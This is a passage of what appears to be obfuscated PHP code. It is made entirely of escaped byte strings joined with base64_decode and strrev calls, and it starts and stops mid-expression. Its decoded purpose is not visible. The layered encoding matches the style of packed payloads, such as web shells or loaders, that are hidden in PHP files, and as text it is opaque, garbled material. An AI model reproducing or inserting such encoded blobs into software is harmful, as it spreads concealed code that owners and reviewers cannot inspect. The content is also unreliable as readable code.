7\3\20\312\242\302\244\275\154\216\261\140\6\154\61\13\325\352\103\22\17\21\274\40\41\17\10\51\327\146\16\62\352\357\102\240\206\224\236\350\37\47\15\205\240\67\46".base64_decode('pUts6jrpTzdgczf9UQ2rSeKbOMrpq2r2rECY1aozJgJfCmXQGhYtV51MjnWrVWA6WjJLjA==')."\x24\xe7\x82\x28\xda\xa2\x1b\x7d\x29\x68\xa8\x81\xab\x4b\x98\x69\x33\xaf\xa5\x31\xed\x67\x82\x6b\x9f\x1\x64\x38\x97\x2e\x20\xbc\xf7\xe3\x8a\xe3\xa9\x42\xa6\x7\x38\x15\x1a\xa3\x3e\xdd\x16\x32\xa5\x35\x8c\x4".base64_decode('rwzjyIit26FGB9+FmF/FuNrly2X7KidCXWrNjCoMgGmEniHhuqAXd92XMNHCbtX69VrcFw==')."\xa0\x66\x73\x9\x94\x45\x24\x82\x39\x17\xf3\xb8\x3a\x37\x5d\xc0\xd3\x93\xf6\x65\x50\x25\xa4\xce\x6\x93\x73\x65\xba\x7d\x99\xeb\xe4\x71\x8a\x9e\xcf\x9b\xf9\x93\x20\x7\x9\x2b\x84\x51\xe2\xe9\x82\xca\x6d\x2e"."\x76\x58\x88\x4\xb0\x70\xca\xe4\x62\x8a\xc9\x90\xb1\xd6\xf\xfd\x9e\x54\xd3\x4\x64\x23\x89\xc4\x35\x9f\x65\xa3\x49\x40\x1d\xd4\x92\xc9\x52\x60\x44\x6a\xa0\x82\xd5\xc\x4f\x49\x2\x93\x3\xfc\xb1\x69\xe8\xaf"."\x60\xfa\x49\x33\xa3\x31\x16\x4a\x98\x9f\x9e\xa4\xdc\xcf\x1\xa2\xcb\x96\x82\xa6\xb0\x7a\xf3\xb6\x89\x13\xf3\x8e\x9c\x8\x13\x53\x26\xb4\xc\x4d\x3d\xf4\xaa\xc0\xbb\xc7\x3a\x9a\xd4\xd3\x3a\xc3\xa2\x94\xce\x4"."\x88\x2a\xc8\x86\x86\x9f\xe3\x58\x2f\x47\x76\xb4\x45\x40\x50\x21\xb9\x19\x56\x14\x95\xc4\xec\x9e\xc5\x97\xe0\x3d\x95\x0\x60\x99\x7\x90\x47\x4\xd3\x68\xea\x22\x64\xd5\x88\x78\x7b\x5e\xef\x35\x86\x18\x81\x18"."\xb2\x5b\xb5\x7c\x3f\xeb\x18\x2a\x29\xd6\x1b\x8e\x48\x6b\xb1\xa9\x23\x1c\x56\x1b\x22\x6d\x71\xb4\x25\xa3\x90\x25\xd1\x50\x3c\xc8\xe8\x50\xa0\x51\xd\x34\xb4\x43\x4c\x50\x36\x2e\x96\xc9\x82\x5\x85\xc\xd4\x0"."\236\240\106\370\205\4\204\130\160\316\314\42\372\11\44\310\53\66\154\105\111\111\41\40\0\202\10\241\302\45\47\40\116\237\31\361\146\20\361\360\362\66\71\305\63\5\330\75\225\362\102\60"."\115\111\76\71\170\360\320\102\146\162\141\173\44\6\5\26\140\50\222\315\173\370\172\153\357\200\244\214\204\42\315\101\0\116\0\254\112\151\40\161\7\226\304\30\13\57\240\374\171\143\104\23"."\135\132\300\332\303\72\222\111\13\121\337\331\53\257\230\371\202\345\325\261\224\41\276\60\335\333\322\32\150\360\306\132\2\65\63\146\122\350\262\114\262\53\336\142\130\135\247\361\70\14\343\240"."\65\135\315\353\210\340\260\17\325\124\125\63\162\200\244\44\251\171\313\274\31\57\256\5\217\240\257\252\252\212\325\65\165\246\222\102\164\216\163\223\44\231\45\30\273\236\102\242\237\55\30\55"."\301\104\137\314\145\54\357\240\301\50\363\104\276\113\230\130\214\75\23\235\374\20\252\50\20\116\254\152\11\374\61\25\325\150\27\54\171\244\320\262\112\242\102\6\223\350\51\124\113\367\241\101"."\xb7\x53\x19\x19\x28\x26\x9e\xc6\x75\x2a\x1e\xf2\xb9\xe3\xa3\x88\xc7\xd6\x89\xe3\x72\x93\x72\x26\x12\x48\xa1\x1b\x4b\x4b\xb6\x61\x69\xa9\x36\x2c\x75\xb5\x61\x69\x71\x1b\x28\xc8\x32\xfa\xb2\xa8\x97\x8c\xb9\xc1"."\x74\x34\xe3\xe9\x90\xa6\xd5\x31\xcd\x43\x2a\x2a\xa8\xc2\x1a\x52\xe5\xae\xc0\x20\x41\x37\xe4\x94\x16\x4e\xcd\x58\x27\x5b\x1b\x67\xb0\x76\x4\x5a\x4f\xf3\x36\x6\x18\x2d\x98\xb7\x0\xa1\xa8\x32\x80\x35\x4d\x66"."\xb6\xae\xbc\xda\x57\x55\xae\xb0\x1d\x73\x5d\x79\x47\xbc\x9\xed\x1f\x16\xcc\x9f\x30\xaf\xc1\xcc\xe4\x30\x61\x6c\xc5\x9b\x44\xbc\x84\xe8\x46\x71\x3e\x2c\x8f\x79\x58\x36\x63\x91\x76\xbe\xc2\x68\x3c\x18\xd7\x80".strrev('w†/œÚ†¬0cHÖÔ‹mB[Å#„r†,aÀ	|fiˆŞ„Y˜£-«ÇùæùËóÎ9')."\264\213\316\313\360\372\110\274\305\1\355\100\222\332\342\100\70\344\316\36\134\32\212\305\143\45\223\20\254\43\350\112\151\254\127\333\243\301\246\320\122\36\155\12\5\303\215\61\265\41\320\320".base64_decode('IvK0BVohgkQiPZ20/M78KhI5Y1ydpsKEQcyhwVKZbkYVtBhtX3RAYOguVkiSnqhs0Re4AA==')."\311\366\352\31\306\154\321\326\13\146\204\355\73\52\350\117\245\22\210\51\166\116\345\154\265\147\230\7\111\67\130\34\11\33\360\175\5\304\337\242\26\250\70\117\275\264\311\51\15\10\364\332"."\134\340\164\305\21\23\21\151\150\6\2\104\363\211\60\201\314\10\174\306\100\54\51\157\7\130\163\172\205\326\121\215\264\7\243\1\254\263\124\227\104\43\155\315\120\140\60\245\263\6\204\140"."\xf8\x2b\xd8\xae\x13\x54\x97\xb6\xe0\xec\x5a\xda\xd0\x60\xc9\x67\xc4\xa0\xaf\x30\xd9\x50\x4e\x6\x9a\x6a\x70\x91\x3e\xcb\x86\xbb\x7\x4b\x37\x4c\xae\x65\x81\x5e\xb4\x1e\x98\x64\x62\x16\xf8\x67\x7a\x4c\x33\xcd".strrev('MŒcŒM}3öm„Œ(‘£F'."\n".'CBLh¥©¶'."\n".',œ'."\0".'O9SÕãÇa‹'."\n".'çpØˆV	†]').strrev('—meAk'."\n".'õ/^y­“(|ºÄ(Ğ§)ÊFëêéÑZœïOûÏƒˆHêú¦ûòq°cşb')."\xbf\xcb\x5f\xb1\xa0\xb6\x33\xe0\x1d\xd1\xbc\x23\x55\xde\x39\xde\x6e\x24\x91\x57\x4e\x5\x40\xf7\xaa\x1a\xcf\xf4\x35\x38\x3\xca\xb8\xe0\xe4\x6e\xf4\x53\xd7\xb5\x60\x52\x97\x77\xf2\x19\xcb\x4f\xe9\xec\xea\x2e".base64_decode('r516Upfv5K7B7imVC9h3EoU8EvoZ6UdNTU6tQE1C21KeJStRNJKBJYwYOQFdNXMNg6M51A==').base64_decode('+0SJTm/X1O4FUjkJ5P4WYklIgEnxfAHvabhnvChe8IAfhWxC8He8IHo0vr/ry4p9lJ3nOg==')."\xd0\x1\x84\xa4\x82\x59\xad\x9a\x44\x7f\xd7\xb0\x89\xec\xd3\x87\xb8\x20\xd0\x6b\xe4\x1\x3b\xb\x59\x63\x25\xdb\xd0\x64\xf5\x95\x10\x30\x6d\x86\xd8\x3d\xba\x3d\xa8\x33\xf4\x40\x70\x47\x1c\x21\x7\x63\xa0\x28"."\111\212\245\45\346\113\224\125\34\107\71\62\31\71\25\357\355\6\171\14\361\143\230\247\203\41\267\225\320\162\172\114\352\241\252\306\3\365\341\240\312\110\13\220\140\26\47\344\260\236\237\224"."\240\256\11\122\312\10\203\244\210\42\212\41\130\362\326\312\264\102\50\2\335\124\325\222\103\43\253\220\303\373\43\5\315\70\32\133\5\111\102\112\335\174\205\16\71\224\123\345\11\310\361\175"."\17\326\144\352\142\321\143\322\4\155\312\211\31\262\320\226\204\155\12\374\25\135\135\205\116\75\331\335\211\20\137\363\366\166\257\232\266\246\222\151\113\374\135\350\17\213\4\112\34\137\250\234"."\xc\xaa\x48\xc0\xf5\xe1\x76\x70\x35\xb5\x23\xc2\x93\x69\xd4\xcc\xf3\x9d\x45\xce\xb1\x7f\xb7\x4d\x5b\x4b\x3b\xaa\x88\x63\x8\x23\x4d\x4c\xc\x1\x85\x2d\x9d\xed\xb0\xa0\x58\x58\x16\x96\xce\x7d\x8\x1d\x6d\xe3"."\xa\x52\x2e\x51\x4a\x7\xf\xb8\x44\x4c\xb7\x7d\x3c\x87\x47\x4a\x54\x51\xdc\x71\x6\x57\x57\xc6\xa8\x7c\x16\x2d\xa7\x6\x89\xc7\x51\xb5\x79\x8c\x6c\xfb\x1d\x87\x45\x96\xae\xe5\x13\xa9\xa6\x42\x3a\x6d\x73\x6d".base64_decode('S9rohy/AWoGzKy+wgamlijaZeaZ8nALNKJtSKmMomzWTPTKqCe7aHEByTFypYOcsSqhNqQ==').strrev('µ8xŒ›M[uÀÍØ`0:eê]êËÑ¨OÑÂ3°½Äí‚Ä%$ 09‚›@ÁÂD')."\40\170\157\346\301\272\10\17\26\52\74\250\325\36\254\276\360\210\235\257\107\34\137\170\6\14\175\220\4\370\256\324\3\233\125\217\120\274\100\60\324\350\61\254\106\262\351\46\37\40\111\254"."\11\166\12\153\225\323\332\260\207\66\47\254\17\350\151\17\123\311\170\130\33\75\114\21\345\41\12\244\106\150\126\7\132\116\320\54\22\104\124\63\345\301\10\204\361\327\43\16\124\74\346\140"."\x56\xcf\x93\x2c\x30\x30\x62\xbf\xee\x11\x7b\x79\x4f\x5f\xde\x2c\xe4\xda\xd9\x37\xa5\x18\x6d\x16\x0\x44\x9b\x39\x20\x6a\x9a\xb6\x87\xe9\xb6\x3c\xb2\x92\xb\x5a\x11\x60\xeb\xa4\xe4\x70\x96\xee\xd\x19\x7f\x77"."\x23\x0\xbf\x70\x52\xf1\x28\x7d\xc3\x64\x15\xcf\x87\x53\xbf\xb7\x8a\xd6\x8\xca\xcc\x35\x8c\xcb\x39\xf2\x10\x3d\x1b\x17\x3b\xf1\x80\x8b\xd0\x62\xb1\x50\x71\x7\x9a\x34\x38\xba\xa3\xd5\xca\x61\x8e\xa0\x59\x27"."\242\212\263\23\161\152\46\204\134\267\26\306\175\236\206\77\212\166\42\61\351\163\266\326\307\276\205\211\25\337\247\224\310\112\303\121\75\61\234\20\152\235\106\111\131\344\214\25\120\15\61\255"."\327\325\55\17\131\107\245\326\100\351\71\346\170\315\247\144\302\301\7\263\61\146\310\316\347\327\261\106\276\171\165\102\277\10\11\214\344\204\20\101\33\213\311\160\14\61\265\246\64\33\224\32"."\x39\x19\x8\xb0\xc7\x19\xc3\x8b\xcb\x47\x8\x32\x39\xa1\x8e\x71\xa5\x61\x38\xd8\x14\x57\x16\x46\x10\xf5\x32\x4c\x95\x96\x51\x71\x66\x85\xfc\x67\x66\x15\x47\xdd\x6c\xb8\x94\x3a\x92\x2e\xe2\x5a\x36\x49\x21\xcb".strrev('ejb`Î…r¬ •š~HÃ0DP1;‚û¤Œ[‡‡ˆÅ*‹ÙÄĞ.(æR>ÆW^_¥')."\274\224\310\215\0\260\166\71\276\213\243\142\115\61\224\120\360\7\74\222\254\202\111\212\127\254\16\51\352\34\162\27\106\272\130\50\36\242\166\43\73\154\144\143\6\336\233\273\241\202\13\13".strrev('Åå¥>0ë'."\0".'#e$T9jäÔ;jT\\zÔMšƒı²6“×øà{õ¢ú¬2˜^9X£n/'."\0".'!').base64_decode('YDIqhEkB74OFs4iolK1XGxACiqOMREsse5i1Xg46K6XRRg/5bUGNl5crnx5MR1gmSoIQLQ==').base64_decode('CKOxQj+kI3HTg3X36IeycYs1GWdieF/INMJZAA4vRgSAyWVowCsYAQFhQpV0AZwAOcUB2g==').base64_decode('kgAn70heTyNulvfhNdKMeRIbE0reZJyL6aifUL2oIVaUJucWOlRM7gV74AdgfImJ8RXrqQ==')."\x4f\x34\x8\xf\xa7\x5a\xdc\xe\x8c\xc1\xa5\xe3\x4d\x79\x93\xb\xb7\x9c\xb3\xbb\x33\x35\x90\xdd\x23\x37\xe8\x70\x71\x63\x69\x3c\x1c\x12\x44\x11\x48\x2a\xe3\x96\x25\x5c\x50\x57\x14\xcb\x17\x25\x18\xd\x5\x31".base64_decode('5Rg9jslTBuZDewKwz/FUSeKWoDOr6JEYMLw1rnm2TRNtNPO+PPqyaJBE44BAEBsNzAdlIQ==')."\201\327\142\241\4\211\132\73\145\41\126\62\226\323\30\221\346\162\32\303\136\262\253\50\10\302\111\232\54\332\303\133\101\23\302\134\270\305\344\41\230\64\154\14\301\353\315\144\347\100\42\243"."\xe0\x90\xee\xc2\x22\x2e\x93\x6c\xc2\x79\x8a\xe6\x5e\xec\x1c\x3c\x93\x1c\x39\x9d\xd2\x2\x0\xa7\x10\x96\xee\x13\xc2\x4d\x69\xb3\xa4\x84\x99\x3\x84\x90\x4c\xf5\x32\xe6\x80\x2e\x1\xf1\xb9\x5b\x4e\xa4\x48\x51"."\232\54\45\211\112\245\134\174\216\110\213\320\362\112\22\221\130\214\2\311\13\145\311\176\232\256\140\37\336\101\370\144\72\35\310\347\31\376\322\156\342\63\141\4\224\101\230\374\305\330\342\53"."\305\256\150\345\301\1\141\210\107\253\302\37\366\321\325\217\17\36\43\354\220\137\16\27\147\225\225\212\245\53\212\211\303\167\147\254\164\366\100\72\55\314\245\334\361\161\213\320\125\57\27\222"."\x21\xe3\x16\x6b\x22\x9b\x59\x66\x69\x50\xa\xc6\xb7\x31\xe3\x8b\xe6\xee\x3\x70\x27\xa5\x1e\x5f\x64\x19\x87\xc6\x89\x69\x2c\x1d\x47\xcc\xb9\x21\x65\x64\x75\xa6\x72\xe9\x35\xf2\x56\x29\x92\xf5\xff\x59\x36\x2e"."\36\171\274\102\306\103\27\234\46\251\237\261\101\360\200\56\357\31\270\252\125\220\50\316\265\213\144\21\220\7\244\210\152\73\104\252\50\251\137\132\116\16\14\101\313\227\216\7\346\130\241\210"."\317\32\7\147\335\371\270\155\11\241\211\103\234\321\312\205\160\22\236\113\271\122\41\302\175\115\176\136\271\20\347\344\174\10\167\161\302\170\155\145\311\274\226\135\57\135\375\354\313\33\150\370"."\212\35\27\154\372\335\257\150\170\172\15\234\167\256\336\157\365\167\126\357\117\303\302\42\374\234\245\303\346\361\117\377\240\371\220\177\255\232\175\227\267\142\105\113\254\254\160\347\355\207\304\346"."\115\134\170\324\366\233\47\236\270\361\230\307\337\130\226\177\362\265\353\107\337\373\145\313\35\137\75\235\272\166\366\231\67\265\234\172\314\155\27\36\275\365\245\375\275\57\76\165\330\213\112\340".base64_decode('yH+9Hm9+ONg7ePEbk7Y2HjF9mvnn5x96+9OLOz559vAbvtj77OEHfffT/f722Mpvrdnyfg==').base64_decode('wyFHPjO47qvN5roXvtq1QctN+PCh7Jsf3X/uurXXb/mF96v7rl/+hyeHnui78g9n7zdx9Q==')."\x65\x23\xbe\x43\x3c\x53\x66\x9d\x72\x4a\xf5\x65\xaf\x3e\xbb\xe8\xb0\x7\xf\xdd\xff\x47\x61\xed\xa1\x27\xd6\xd6\xbe\xbc\x75\xe0\xb0\x5f\x9c\x16\x59\xf0\xde\xae\x39\x7f\xbd\xf8\xfd\x2d\xb9\x2d\x1f\x6f\xf8\xf3"."\217\2\103\127\76\167\124\140\354\227\127\16\177\366\317\271\377\376\174\352\345\317\237\173\366\342\163\42\277\376\361\211\213\106\207\242\346\214\175\253\157\175\351\217\276\31\377\232\130\371\341\111"."\xcf\xde\xf0\xc7\xdc\xe5\x4f\xfe\xf8\x9e\xbb\xde\xbd\xf5\xd7\x1f\xf5\x3d\x95\x3c\xd9\xdc\xfa\xc3\x77\x73\x33\xfe\xd7\x25\x55\x77\x6f\x3c\xfa\xd8\x3\xff\xb5\x46\xbb\xe6\xab\x37\x93\x3b\x77\xdc\xbf\x65\xda\x3f"."\173\137\276\143\331\374\351\351\33\167\245\157\372\335\307\223\327\147\67\357\53\114\175\344\265\75\127\56\74\176\355\17\47\376\351\275\145\251\357\375\343\206\35\177\314\375\366\300\345\375\107\256"."\173\154\313\245\201\153\367\35\125\273\265\345\364\312\276\26\143\377\203\46\277\372\203\275\207\274\372\340\21\133\106\117\232\336\244\247\47\34\375\170\371\342\153\253\316\74\66\376\314\1\253\317".base64_decode('XHf+a4deunzlT47/cLN+5I27nkwcedalBx1459of1E88f+fsn/1hUc/d2Zs26Ub1w3+6+Q==').base64_decode('sLf69z/o+ZbVh/1o+c///PyR+W+9ctcbfz5i4fsHfm/O6cckjpsaPni99/CF1vf2W1u3+g==')."\133\213\276\373\327\320\45\357\117\72\354\223\107\225\262\105\133\337\311\275\72\263\165\370\167\347\134\321\60\366\326\161\115\267\330\233\224\253\346\371\67\14\326\17\36\331\276\364\361\47\366\253"."\37\72\62\322\265\176\355\276\27\77\371\315\63\33\376\136\166\277\66\367\336\233\276\137\165\333\171\327\7\47\274\335\75\161\162\233\65\153\360\247\325\323\332\243\137\116\274\377\42\105\171\331"."\63\364\130\373\167\217\277\167\356\302\330\141\317\177\274\176\364\261\57\327\237\177\124\353\371\77\257\310\254\335\174\336\203\177\33\262\77\271\245\177\340\261\335\377\272\145\343\35\267\277\367\350".base64_decode('2sfTXXetebG58oRzsxe/9Kjx/H5DZ6z5yYd/e/usY9vPPnCtfdnPAsfV2it//tMjnvF7Dw==').base64_decode('PdY+YfSxOT3P/+ivU7o2nTuzZs8p/578wNh+3558wpzm9KOx83pWr3h03Uu9v9/Ymlj+6g==')."\257\16\252\257\152\271\375\375\303\246\377\327\307\107\177\267\175\141\162\376\61\7\373\12\117\134\175\363\377\272\370\210\67\36\77\371\340\237\135\263\173\312\151\107\135\275\372\270\233\37\315\327".strrev('Kµ¹Á|]×Sİş\\WÏ¢lU¯¶÷Î¦‰/›\'ĞòşC®ü<Ì?­Çáñ>¶¯›üø').base64_decode('uUd78KbfPzfy4O9e/8GSwFvTLoy/8crvajecVhn8y3e+yq094tvnVz5R3vDkQeGYfuhTgw==')."\53\216\277\263\357\27\47\274\160\160\255\176\324\365\23\252\256\236\162\320\307\267\234\276\142\372\151\117\217\354\174\322\170\372\367\231\235\257\257\370\170\354\220\243\367\377\373\233\133\312\46\377".base64_decode('akAJooV1wN8em3SFelTy5paWXd1Xnfbte/5r4R8frzzyppv3fO+4JeEDB2Zvf3DT8n3ntA==')."\x9f\x3e\x34\xf5\x8a\xdd\x2f\x6f\xf9\x8d\xbe\x66\xde\x55\x55\x83\x27\xbc\xd7\x7b\xe8\x7b\x2f\x2c\xfd\xa0\xfa\xa6\x65\x4f\x1c\xdb\xbd\xe0\x81\xea\x6d\xe6\xc7\xbf\xf7\x6e\xfe\x3c\xf9\xa8\xff\x84\xe9\x3f\xf8\xf4".base64_decode('saMvnDThoncPGxna/9lP3tvyxkkDy5f+e9trA8p3Ps8dvf9r/zls047LvekH/7Kz4/7Ttw==').base64_decode('vmh97+fPPnXO8f4fnnjAlCuCr9wS/nzDih+s355Yv75zlnLSNQ9N8h2ejt1yqH/XOd7jvg==').base64_decode('CK58acVA6/sn/KNz38gjHS9dckd368f6Aadd+synA6t23vvnrbvueGPFkpaqA7ZNtZI7bw==')."\xff\x78\xe9\x33\x7b\x47\xdf\x88\xde\xbd\x2c\x33\xf1\xa4\x27\xf7\x3c\xd0\xe2\x89\x7\x67\x3e\x76\xe0\x29\x7\x2d\x3f\xe0\x7\x6f\xfd\x79\xff\x5d\x3b\xaf\xdd\x37\xe3\xdb\x7f\x3d\xe5\xb6\x5f\x7d\xf4\xd9\x27\xf"."\x1f\x3c\x65\xec\xd9\xdc\x51\x99\xa3\x27\xb4\x5c\xf9\xc2\xcd\x4b\xbf\x78\xf0\xad\xf9\xdb\x26\x7f\x70\xda\xd5\x8f\xd\xfe\xfd\xa3\xd\xb7\xfc\xd7\xfc\x5f\xef\xbe\xe4\x80\xbf\x7c\xff\xdd\xa3\x1f\x7d\x63\xfd\xf7"."\x32\x9e\x23\x6f\xda\xdc\x77\xf8\xe8\x21\xbb\xb6\xbe\xbe\x7a\xcd\x7\xb7\x68\x63\xaf\x4e\x78\xf7\xb9\x45\x53\xef\xdb\x94\x7d\x72\xce\xb7\x2f\x9f\xf0\x60\xc3\xc7\x3f\xee\x19\xf8\xc7\xb5\x7d\xc7\x9c\xf9\xd5\xe8"."\xef\x7f\xf1\x88\xba\xf3\x8c\x91\x7d\xaf\xde\xfa\x97\x79\x67\xae\xfc\xf8\xdf\x1f\x3f\xb8\x64\xfb\x23\xf3\xce\xdc\xb7\xfd\x9f\x87\x9f\xde\xb5\xfa\xdf\xf7\x3d\x77\xf5\x76\xdf\x7f\x3e\xfb\xc5\x9c\xf9\x7f\x7d\xa4"."\xf9\x8b\xb7\x3e\x3d\xf3\x8f\xe5\x83\x67\x6c\xfa\xf5\x8d\x3f\x5e\x35\xf3\xe6\x9e\x9\x2b\xf7\x3f\x71\xd9\x31\xd1\xd\xff\x3c\x75\xc6\x1\x4d\xb5\x8b\x8e\xd5\x3e\xa8\x3c\x64\xcb\x7b\xdf\x7a\xfc\xe5\xc9\x6f\x36"."\xbc\x78\x4f\xef\x7b\x27\x2f\xbf\xa8\x7e\xaf\x37\x78\x75\xbc\xe7\xf3\x17\x76\xfe\xf7\x1f\x7f\x75\xd2\xe4\x4f\x7e\x18\x9e\x31\xb6\x70\xdd\xf0\xf4\x5b\xd7\x56\xee\x68\xbf\xfc\x19\x6f\x6e\xa8\xe2\xb9\x73\x17\xe"."\x4f\x8\x7e\x1a\xee\xff\xa2\xe2\x9f\xff\xfd\xf2\x6f\xde\xbe\xea\xf5\xe7\x46\xaa\xcb\x5f\xce\x3e\x7c\xe7\x27\x43\x86\x3e\x7c\xe6\xf6\x5b\x3a\x2e\xd8\x34\x7c\xb9\xcf\xff\xc0\x7\x9f\xfd\xbb\x7d\xc3\xa4\xe6\xd0"."\300\303\307\75\25\210\124\67\235\61\47\172\325\221\67\55\270\374\320\123\222\307\355\367\121\270\51\165\331\263\317\114\171\342\217\173\322\67\156\256\76\342\236\226\357\136\160\312\37\66\337\171"."\xc5\xca\x53\xdf\x7a\xe8\xd4\xb9\x97\xeb\xbf\x7f\xf7\x85\xec\x53\xf1\x43\xe6\x1d\x7e\xe4\x96\x5d\x87\x3c\x75\xc6\x9e\x57\x67\xbf\xf8\xce\xdd\x37\xfd\xfc\xef\xe7\x47\x2f\x6d\x9f\xfd\xda\xdf\x5f\x3f\xe3\x8d\xf3"."\267\167\276\160\327\215\37\14\357\370\341\372\131\27\276\171\364\236\11\327\316\111\54\136\371\124\163\171\362\201\55\257\34\27\70\263\347\322\317\157\376\333\343\247\235\271\375\232\265\257\334\235"."\xf0\xee\xbd\x72\xee\x2b\x5f\xc\xf4\x7f\x90\xbe\xfb\xcd\x7f\x3d\xdd\xb9\xb3\xe9\x17\x7f\xba\x7d\xb4\xe5\xd0\x1f\x8d\xed\xfd\xc7\x97\xbf\xbf\x68\xda\xd\xe1\xa7\xdf\xb8\x7e\x45\xe4\xd3\x3b\xee\x99\xb0\x6e\xf3"."\77\232\376\373\215\327\273\377\362\316\151\277\176\375\257\37\244\337\350\132\166\372\224\305\53\176\366\207\330\224\213\176\363\362\147\355\63\53\337\333\260\243\354\127\277\355\172\170\371\373\337\327"."\327\44\46\247\253\316\310\237\75\172\304\130\305\21\273\336\235\133\376\346\121\237\35\170\127\335\224\251\367\365\257\77\376\271\17\316\33\251\334\266\352\352\303\353\57\377\260\141\342\27\157\325"."\xf6\x5c\xa5\x9e\x96\x78\x33\x76\xca\x6f\x26\xed\xf7\xda\xc1\x9f\xcf\x3c\xe9\xa0\xb3\xce\xfb\xc3\xdd\x4b\x7f\xf1\xdb\xe3\xbe\xbf\x2e\xb2\xf6\xbb\x3b\xce\xb8\xf4\xbd\x3f\x5c\x7b\xcd\x1d\xd7\xbd\xf3\xd9\xd9\x3f"."\x1a\x18\xd9\x7f\xe2\xd9\x6f\xdf\xba\xeb\xd4\xae\x1f\x3f\xad\x1f\xba\xf9\xd1\xa9\x93\xf6\x37\xf7\x7f\xff\xf6\xf7\x37\xed\xff\xc3\xb7\x27\xbf\x3b\xf3\xed\x1f\x3c\xf9\xf7\x47\xf\xf0\x6e\x7e\xea\xce\x9f\xde\xb5"."\375\250\206\364\161\57\365\305\76\333\171\362\266\217\276\330\244\127\76\233\233\156\336\377\314\300\236\307\146\355\123\67\116\367\276\161\153\343\113\267\164\164\326\34\76\155\303\3\307\4\353\327"."\xbc\x79\xc7\x25\xff\x79\xf2\xb7\xe9\xd9\x57\x6d\x3d\xf2\xba\x91\xf3\xaa\x2f\x68\x9b\x76\xfc\x2d\x35\x47\x96\xb5\xc4\xb4\x3\xba\xce\xea\x7d\xf8\xfd\xbe\xd7\x5e\xbd\xfd\xda\x8b\xd6\xde\xd6\x31\x2d\xfe\xf8\xb1"."\317\76\165\153\342\333\367\357\373\323\123\123\316\32\73\355\204\253\364\107\367\357\372\154\311\321\357\76\364\275\357\157\236\166\344\234\135\213\337\337\164\377\153\352\366\143\217\367\315\260\126\175"."\xfc\xec\xd9\xd7\xff\x69\xd9\xb9\x47\x9f\x78\x60\xe0\xf8\x13\x7f\x94\x39\xfc\xc7\xbb\x1f\x2a\x5c\x7a\xdf\xac\x4b\x3e\xf9\x64\xe1\xfb\xd5\x5b\x8e\xba\xeb\xf4\xcc\xef\x9f\xba\x61\xfe\x75\xcb\x7e\xf9\xd8\xc6\xb9"."\xd7\x8e\xad\x19\x7c\x7a\xcb\xd\x7\xdf\xd9\xfc\xcc\x6f\x8f\x19\xf8\x74\xea\x3d\x6f\xed\xfa\xe8\x37\x6f\x3f\xfd\xb3\xdb\x5e\x58\xfb\xe7\x4f\x2f\xfb\x68\x6d\xe6\x5\xfb\xf0\xfa\x5f\x9d\xd2\x62\x5f\x33\xe9\x87"."\237\255\116\207\276\263\357\17\143\217\217\370\316\371\262\343\376\277\377\46\163\327\256\350\176\257\134\166\153\343\101\177\372\257\57\233\313\267\137\276\121\71\352\211\212\371\353\137\375\335\252\343"."\173\376\24\57\337\335\335\271\360\250\147\73\217\72\267\343\300\53\52\56\32\371\133\274\354\312\216\321\217\366\55\360\337\260\146\370\37\237\377\166\333\303\237\175\274\357\134\365\372\377\174\60"."\270\347\304\65\253\367\275\164\367\205\13\276\374\374\332\143\156\274\156\301\347\145\236\267\226\104\156\124\277\332\363\356\207\237\276\373\110\327\303\43\303\373\236\75\150\317\43\137\76\276\357\351"."\23\117\77\343\343\113\176\361\333\5\137\376\347\314\5\157\353\335\361\177\176\272\164\356\53\347\74\172\335\135\147\374\366\126\355\311\207\126\176\372\324\353\253\77\170\377\323\365\57\334\367\334".base64_decode('VSsyffc9fN9fZqfu/eP123bNnVf78H/ePGnv8ZN/fWDD58n1JxyzKvHWK2/aNddfP7r41Q==')."\x8f\xce\xf9\x78\xe3\xb\x5b\x7b\xc6\xfe\x7e\xc9\x39\xb7\x3c\xb6\xa4\xec\x3b\xff\xd4\xe\xf8\x69\xf9\x87\x9e\x83\xd6\xff\xa3\xe5\xbe\xa5\x77\xee\xbd\xf8\x2\xff\x49\xa1\xbf\x6c\xba\x6b\xe5\xf2\x4b\x37\x3f\x7f"."\326\213\33\247\336\173\360\343\373\356\73\361\325\201\332\217\216\142\27\332\252\147\316\2\251\76\71\70\262\262\0\342\42\310\110\263\340\214\165\332\214\71\0\230\11\146\103\63\247\3\4\64"."\275\163\146\101\221\331\65\0\1\323\51\55\327\63\324\307\266\314\240\161\233\123\15\365\326\314\0\143\311\151\120\170\66\44\314\2\200\331\123\110\246\372\230\320\234\111\15\15\27\140\27\61"."\275\212\67\11\312\114\237\15\225\315\140\1\173\160\300\354\317\44\240\356\71\120\347\34\246\367\113\14\367\255\30\201\303\264\231\65\254\226\71\320\303\201\254\221\313\60\121\174\244\57\61\230".base64_decode('Y3bCM9mns4OJdIHtilj1WTszmBsCFeAMGNxkv57LD4FGdHo1jNX0mVAmnerv7WNX+aZPhw==')."\x16\x64\x93\x29\xbb\x5f\x3\xb9\x3e\xd3\xbf\xc2\x5a\x99\x83\x16\xac\x18\xc8\xf\x8f\x58\x10\xc9\x6b\x7d\xbd\x3\x2b\x60\xf7\xc0\xa6\x81\x8d\x70\xa2\xcf\xe8\x1f\xce\x8c\xc0\x5c\x98\xc3\x3d\xd6\x0\x6c\xca\xfb".strrev('Y\\á+s°­lÃ	*v#•Šäm3eãa®ÌÌÀV&V¥Î‘…Œ,¡ÉÒ+ÃöEs	R')."\37\314\15\257\30\201\175\335\160\76\251\367\214\100\167\146\125\101\3\373\14\55\125\30\4\53\202\331\323\341\143\131\163\145\46\141\301\40\316\236\11\270\324\263\322\130\221\37\4\1\277\146"."\16\314\362\220\335\333\257\367\301\107\252\153\140\360\22\275\3\311\225\51\150\307\264\351\323\331\300\145\315\76\33\240\106\146\105\156\160\145\57\253\145\240\147\260\237\31\375\332\251\154\272\7"."\24\237\250\67\166\176\10\64\140\275\272\326\323\237\147\332\222\341\225\151\215\235\117\47\173\106\206\322\71\230\303\232\151\14\303\341\303\106\166\250\77\65\222\141\173\20\30\312\221\341\234\326"."\147\1\164\16\103\333\232\152\350\303\234\52\310\67\203\215\171\315\164\200\130\331\102\336\64\6\331\327\140\326\147\114\257\146\310\70\203\55\107\50\60\175\26\324\136\135\305\26\50\33\354\276".strrev('Úg°Íº½Ãò²d